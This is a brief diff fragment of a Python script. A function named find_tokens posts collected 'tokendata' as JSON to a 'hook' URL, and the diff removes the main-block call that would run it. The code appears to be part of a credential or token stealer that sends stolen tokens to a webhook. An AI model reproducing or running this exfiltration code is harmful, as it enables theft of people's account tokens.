@@ -77,5 +77,3 @@ def find_tokens():
         "Content-Type": "application/json"
     }
     r = requests.post(hook, data=json.dumps(tokendata), headers=headers)
-if __name__ == '__main__':
-    find_tokens()
